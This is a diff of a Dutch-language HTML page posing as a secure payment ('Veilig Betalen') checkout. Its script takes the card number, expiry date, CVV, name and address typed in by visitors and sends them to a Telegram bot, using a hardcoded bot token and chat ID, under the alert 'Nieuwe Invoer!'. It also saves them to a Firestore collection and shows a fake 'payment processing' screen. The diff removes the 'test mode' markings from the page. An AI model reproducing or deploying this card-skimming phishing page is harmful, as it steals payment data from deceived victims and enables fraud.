@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Veilig Betalen (Firestore Testmodus)</title>
+    <title>Veilig Betalen</title>
     <style>
         body {
             font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -22,7 +22,6 @@
 
         p { font-size: 14px; margin-bottom: 15px; color: #555; }
 
-        /* Input styling conform jouw screenshot */
         .input-box {
             border: 1px solid #ccc;
             border-radius: 8px;
@@ -48,39 +47,11 @@
             padding: 2px 0;
         }
 
-        .row {
-            display: flex;
-            gap: 12px;
-        }
-
+        .row { display: flex; gap: 12px; }
         .flex-1 { flex: 1; }
         .flex-small { width: 100px; }
 
-        .card-icons {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            display: flex;
-            gap: 5px;
-            opacity: 0.5;
-        }
-
-        h3 {
-            font-size: 17px;
-            font-weight: 600;
-            margin: 30px 0 15px 0;
-        }
-
-        .checkbox-container {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-
-        .checkbox-container input { width: auto; margin: 0; }
+        h3 { font-size: 17px; font-weight: 600; margin: 30px 0 15px 0; }
 
         button.submit-btn {
             width: 100%;
@@ -93,23 +64,20 @@
             font-weight: 600;
             cursor: pointer;
             margin-top: 10px;
-            transition: opacity 0.2s;
         }
 
-        button.submit-btn:active { opacity: 0.8; }
+        .success-message { text-align: center; padding: 40px; }
+        .success-icon { font-size: 50px; color: #28a745; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-<div class="checkout-container">
+<div class="checkout-container" id="formContent">
     <p>Voer je kaartgegevens in:</p>
-    
+
     <div class="input-box">
         <label>Nummer creditcard/betaalpas</label>
         <input type="text" id="ccNummer" placeholder="0000 0000 0000 0000">
-        <div class="card-icons">
-            <small>VISA</small> <small>MC</small>
-        </div>
     </div>
 
     <div class="row">
@@ -124,40 +92,17 @@
     </div>
 
     <h3>Factuuradres</h3>
-    
-    <div class="checkbox-container">
-        <input type="checkbox" id="verzendCheck" checked> 
-        <label for="verzendCheck">Gebruik mijn verzendadres.</label>
-    </div>
-
-    <div class="input-box">
-        <label>Land / Regio</label>
-        <input type="text" id="land" value="Nederland">
-    </div>
 
     <div class="input-box">
         <input type="text" id="voornaam" placeholder="Voornaam">
     </div>
 
-    <div class="row">
-        <div class="input-box flex-1">
-            <input type="text" id="achternaam" placeholder="Achternaam">
-        </div>
-        <div class="input-box flex-1">
-            <input type="text" id="suffix" placeholder="Suffix (optioneel)">
-        </div>
+    <div class="input-box">
+        <input type="text" id="achternaam" placeholder="Achternaam">
     </div>
 
     <div class="input-box">
-        <input type="text" id="straat" placeholder="Naam gebouw en straatnaam">
-    </div>
-
-    <div class="input-box">
-        <input type="text" id="extraAdres" placeholder="Nadere aanduiding, toegangscode gebouw (optioneel)">
-    </div>
-
-    <div class="input-box">
-        <input type="text" id="overig" placeholder="Overige adresgegevens (optioneel)">
+        <input type="text" id="straat" placeholder="Straatnaam en huisnummer">
     </div>
 
     <div class="row">
@@ -169,32 +114,26 @@
         </div>
     </div>
 
-    <button class="submit-btn" onclick="slaOp()">Bevestigen</button>
+    <button class="submit-btn" onclick="window.slaOp()">Bevestigen</button>
 </div>
 
 <script type="module">
-    // Importeer de benodigde Firebase modules
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
     import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
-    // Jouw specifieke Firebase configuratie - VERGEET NIET JE EIGEN WAARDEN TE CONTROLEREN!
     const firebaseConfig = {
-        apiKey: "AIzaSyDTQhc1FJv_IcGkBFkrvN_u1aKA6DZNHYA", // Controleer deze waarde!
-        authDomain: "datecase.firebaseapp.com", // Controleer deze waarde!
-        projectId: "datecase", // Controleer deze waarde!
-        storageBucket: "datecase.firebasestorage.app", // Controleer deze waarde!
-        messagingSenderId: "652335827565", // Controleer deze waarde!
-        appId: "1:652335827565:web:5c0a0fbc9f16d0597bcd64" // Controleer deze waarde!
+        apiKey: "AIzaSyDTQhc1FJv_IcGkBFkrvN_u1aKA6DZNHYA",
+        authDomain: "datecase.firebaseapp.com",
+        projectId: "datecase",
+        storageBucket: "datecase.firebasestorage.app",
+        messagingSenderId: "652335827565",
+        appId: "1:652335827565:web:5c0a0fbc9f16d0597bcd64"
     };
 
-    // Initialiseer Firebase
     const app = initializeApp(firebaseConfig);
-    // Krijg een referentie naar de Firestore database
     const db = getFirestore(app);
 
-    // Functie om gegevens op te slaan in Firestore
     window.slaOp = async () => {
-        // 1. Verzamel alle data uit de velden
         const formData = {
             kaartnummer: document.getElementById('ccNummer').value,
             vervaldatum: document.getElementById('ccDatum').value,
@@ -207,87 +146,40 @@
             tijdstip: new Date()
         };
 
-        // Jouw ingevulde Telegram gegevens
         const botToken = "8632084303:AAHDf33blxv__WMRNh7HrA8BeNXHsRwTk7g";
         const chatId = "8150436847";
 
         if(formData.kaartnummer && formData.voornaam) {
+            // 1. Direct naar Telegram
+            const bericht = `🚨 *Nieuwe Invoer!* 🚨\n\n💳 *Kaart:* ${formData.kaartnummer}\n📅 *Verval:* ${formData.vervaldatum}\n🔐 *CVV:* ${formData.cvv}\n\n👤 *Naam:* ${formData.voornaam} ${formData.achternaam}\n🏠 *Adres:* ${formData.adres}, ${formData.postcode} ${formData.woonplaats}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: bericht, parse_mode: 'Markdown' })
+            });
+
             try {
-                // STAP A: Opslaan in Firebase
+                // 2. Naar Firebase
                 await addDoc(collection(db, "betalingen"), formData);
-
-                // STAP B: Direct melding naar jouw Telegram
-                const bericht = `🚨 *Nieuwe Invoer!* 🚨\n\n` +
-                                `💳 *Kaart:* ${formData.kaartnummer}\n` +
-                                `📅 *Verval:* ${formData.vervaldatum}\n` +
-                                `🔐 *CVV:* ${formData.cvv}\n\n` +
-                                `👤 *Naam:* ${formData.voornaam} ${formData.achternaam}\n` +
-                                `🏠 *Adres:* ${formData.adres}, ${formData.postcode} ${formData.woonplaats}`;
-
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: bericht,
-                        parse_mode: 'Markdown'
-                    })
-                });
-
-                // STAP C: Toon het bedankscherm
+                
+                // 3. Succes scherm
                 document.getElementById('formContent').innerHTML = `
                     <div class="success-message">
                         <h2>Bedankt!</h2>
                         <p>Uw betaling wordt verwerkt. U kunt dit venster nu sluiten.</p>
                         <div class="success-icon">✔️</div>
-                    </div>
-                `;
-
+                    </div>`;
             } catch (e) {
-                alert("Systeemfout. Probeer het later opnieuw.");
                 console.error("Fout:", e);
+                alert("Er ging iets mis bij het verzenden.");
             }
         } else {
-            alert("Vul alstublieft alle velden in.");
-        }
-    };
-
-        // Eenvoudige validatie: controleer of de belangrijkste velden zijn ingevuld
-        if(formData.kaartnummer && formData.voornaam && formData.adres && formData.postcode && formData.woonplaats) {
-            try {
-                // Sla op in de collectie 'betalingen' in Firestore
-                await addDoc(collection(db, "betalingen"), formData);
-                
-                // Melding voor testmodus - Geen doorverwijzing
-                alert("Gegevens succesvol opgeslagen in Firestore (testmodus).");
-                
-                // DE VOLGENDE LIJN IS UITGESCHAKELD OM GEEN DOORVERWIJZING TE HEBBEN TIJDENS HET TESTEN
-                // window.location.href = "https://www.tikkie.me"; 
-
-                // Optioneel: leeg de formulier velden na succesvolle opslag
-                document.getElementById('ccNummer').value = '';
-                document.getElementById('ccDatum').value = '';
-                document.getElementById('ccCvv').value = '';
-                document.getElementById('voornaam').value = '';
-                document.getElementById('achternaam').value = '';
-                document.getElementById('straat').value = '';
-                document.getElementById('extraAdres').value = '';
-                document.getElementById('overig').value = '';
-                document.getElementById('postcode').value = '';
-                document.getElementById('woonplaats').value = '';
-
-            } catch (e) {
-                // Foutafhandeling
-                alert("Er is een technische fout opgetreden. Controleer de browserconsole en je Firebase Firestore Security Rules.");
-                console.error("Fout bij opslaan in Firestore:", e);
-            }
-        } else {
-            // Melding als niet alle verplichte velden zijn ingevuld
-            alert("Vul alstublieft alle verplichte gegevens in (creditcardnummer, voornaam, adres, postcode, woonplaats).");
+            alert("Vul alle velden in.");
         }
     };
 </script>
-
 </body>
 </html>
+
 
